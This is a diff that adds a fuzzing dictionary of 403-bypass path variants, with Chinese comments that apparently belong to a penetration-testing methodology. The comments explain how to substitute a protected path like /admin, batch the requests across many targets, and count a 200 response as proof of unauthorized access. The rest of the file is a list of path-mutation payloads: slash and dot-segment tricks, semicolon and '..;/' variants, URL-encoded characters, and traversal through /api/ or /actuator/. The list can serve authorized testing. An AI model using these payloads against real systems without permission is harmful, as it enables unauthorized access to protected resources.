@@ -1,0 +1,34 @@
+# 403 绕过路径变体（payload-mutation-algebra §7 配套字典）
+# 用法：对保护路径 P（如 /admin），将 {PATH} 替换为实际路径后逐条请求（多目标/多路径写成单脚本批量）；
+# 判据：任一变体返回 200 且内容为保护资源 → 未授权访问（按 evidence-standard 未授权类判据确证）
+/{PATH}
+/{PATH}/
+//{PATH}
+/{PATH}/.
+/{PATH}//{PATH}
+/{PATH}/./
+/{PATH}?/
+/{PATH};/
+/{PATH};.json
+/{PATH}..;/
+/{PATH}%20
+/{PATH}%09
+/.{PATH}
+/{PATH}..
+//{PATH}//
+/{PATH}/..
+/{PATH}%2f
+/{PATH}%252f
+/{PATH}.json
+/{PATH}.html
+/{PATH};jsessionid=x
+/%2e/{PATH}
+/%2e%2e/{PATH}
+/*/{PATH}
+/{PATH}/%2e%2e/{PATH}
+/api/../{PATH}
+/api/v1/../{PATH}
+/static/../{PATH}
+/actuator/../{PATH}
+%2f{PATH}
+.{PATH}
